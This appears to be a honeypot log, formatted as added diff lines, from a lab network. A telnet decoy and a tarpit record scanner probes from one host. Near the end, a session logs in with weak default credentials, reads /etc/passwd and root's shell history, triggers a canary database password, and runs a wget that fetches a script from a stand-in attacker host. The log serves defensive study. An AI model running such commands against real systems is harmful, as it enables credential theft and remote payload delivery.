+2026-07-21 16:56:08 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:08 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:12 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35398 — entering tarpit
+2026-07-21 16:56:12 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:35386
+2026-07-21 16:56:12 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:12 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:12 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:12 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:13 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:13 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:13 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:17 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:35390
+2026-07-21 16:56:17 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35414 — entering tarpit
+2026-07-21 16:56:17 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:17 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:17 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:17 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:18 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:18 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:18 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:22 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:59016 — entering tarpit
+2026-07-21 16:56:22 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:57386
+2026-07-21 16:56:22 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='< NTP/1.2 >' password=''
+2026-07-21 16:56:22 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:22 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:22 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:23 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:23 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:23 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:27 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='< NTP/1.1 >' password=''
+2026-07-21 16:56:27 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:57398
+2026-07-21 16:56:27 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:59024 — entering tarpit
+2026-07-21 16:56:27 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:27 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:27 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:28 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:28 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:28 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:32 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='< NTP/1.0 >' password=''
+2026-07-21 16:56:32 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:32 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35406 — entering tarpit
+2026-07-21 16:56:32 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60494
+2026-07-21 16:56:32 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:32 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:33 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:33 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.02s
+2026-07-21 16:56:33 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.02s
+2026-07-21 16:56:37 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:37 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:37 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60508
+2026-07-21 16:56:37 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35414 — entering tarpit
+2026-07-21 16:56:37 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:37 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:38 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:38 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:38 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:42 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:38342 — entering tarpit
+2026-07-21 16:56:42 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60582
+2026-07-21 16:56:42 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:42 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:42 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:42 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:43 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:43 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:43 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:47 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:38350 — entering tarpit
+2026-07-21 16:56:47 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60588
+2026-07-21 16:56:47 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:47 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:47 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:47 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:48 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:48 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:56:48 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:56:52 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:59482
+2026-07-21 16:56:52 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='WWWOFFLE STATUS' password=''
+2026-07-21 16:56:52 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:52 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:58 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:46774 — entering tarpit
+2026-07-21 16:56:58 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:59 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:59 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=12.01s
+2026-07-21 16:56:59 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=12.01s
+2026-07-21 16:57:03 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='Subscribe' password=''
+2026-07-21 16:57:03 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:57:03 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:38814 — entering tarpit
+2026-07-21 16:57:03 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:58048
+2026-07-21 16:57:03 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:57:03 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:57:04 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:57:04 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:57:04 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:57:08 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='Query' password=''
+2026-07-21 16:57:08 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:58060
+2026-07-21 16:57:08 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:38822 — entering tarpit
+2026-07-21 16:57:08 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:57:08 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:57:08 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:57:08 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='         g' password='oogle.com PGET / HTTP/1.0'
+2026-07-21 16:57:09 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:57:09 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:57:09 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:57:13 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:59040 — entering tarpit
+2026-07-21 16:57:13 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:59286
+2026-07-21 16:57:13 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:57:13 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:57:13 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:57:14 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:57:14 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.0s
+2026-07-21 16:57:14 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:57:15 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:57:15 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:57:17 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:57:17 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=4.0s
+2026-07-21 16:57:17 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=4.0s
+2026-07-21 17:00:28 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:54132
+2026-07-21 17:00:28 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:57488 — entering tarpit
+2026-07-21 17:00:28 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:00:28 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 17:00:28 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 17:00:28 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:00:28 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=0.0s
+2026-07-21 17:00:28 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=0.0s
+2026-07-21 17:00:28 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:57500 — entering tarpit
+2026-07-21 17:00:28 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:54136
+2026-07-21 17:00:28 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 17:00:28 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:00:39 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 17:00:39 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:58106
+2026-07-21 17:00:39 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:00:39 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:00:39 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 17:00:40 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 17:00:40 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=12.01s
+2026-07-21 17:00:40 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=12.01s
+2026-07-21 17:00:44 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:49290
+2026-07-21 17:00:44 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:00:44 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:00:44 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='GET / HTTP/1.0' password=''
+2026-07-21 17:00:49 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:49298
+2026-07-21 17:00:49 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:00:49 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:00:49 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='OPTIONS / HTTP/1.0' password=''
+2026-07-21 17:00:54 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:57420
+2026-07-21 17:00:54 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:00:54 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:00:54 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='OPTIONS / RTSP/1.0' password=''
+2026-07-21 17:00:59 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:01:30 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:56622 — entering tarpit
+2026-07-21 17:01:30 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 17:01:30 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 17:01:30 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=0.0s
+2026-07-21 17:01:30 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=0.0s
+2026-07-21 17:01:30 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:34906
+2026-07-21 17:01:30 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:01:30 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:10:45 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:35894
+2026-07-21 17:10:45 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:11:15 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='SSH-2.0-libssh_0.10.6' password=''
+2026-07-21 17:11:18 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:11:24 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:43090
+2026-07-21 17:11:24 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:11:34 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='SSH-2.0-libssh_0.10.6' password=''
+2026-07-21 17:11:34 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:11:38 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:54324 — entering tarpit
+2026-07-21 17:11:38 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 17:12:11 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 17:12:11 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=33.01s
+2026-07-21 17:12:11 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=33.01s
+2026-07-21 17:12:13 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:55388
+2026-07-21 17:12:13 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:12:30 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='admin' password='12345'
+2026-07-21 17:12:39 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | whoami
+2026-07-21 17:12:45 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | ls /etc
+2026-07-21 17:12:52 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | cat /etc/passwd
+2026-07-21 17:13:08 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | cat /root/.bash_history
+2026-07-21 17:13:36 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:45754
+2026-07-21 17:13:36 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:13:44 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='admin' password='12345'
+2026-07-21 17:13:50 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | whoami
+2026-07-21 17:13:55 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | ls /etc
+2026-07-21 17:14:01 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | cat /etc/passwd
+2026-07-21 17:14:07 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | cat /root/.bash_history
+2026-07-21 17:14:14 | INFO    | hvedrungr | [lokanet] honeytoken_used | src=192.168.56.20 | export PGPASSWORD='Wint3rfell!2024_canary_8f3a1'
+2026-07-21 17:15:05 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | wget http://attacker.local/x.sh
+2026-07-21 17:15:19 | INFO    | hvedrungr | [lokanet] honeytoken_used | src=192.168.56.20 | export PGPASSWORD='Wint3rfell!2024_canary_8f3a1'
+2026-07-21 17:16:48 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | exit
+2026-07-21 17:16:48 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:16:53 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:52822 — entering tarpit
+2026-07-21 17:16:53 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 17:18:08 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:18:14 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:35472
+2026-07-21 17:18:14 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 17:18:14 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='GET / HTTP/1.1' password='Host: 192.168.56.10:2323'
+2026-07-21 17:18:14 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 17:18:33 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=100.03s
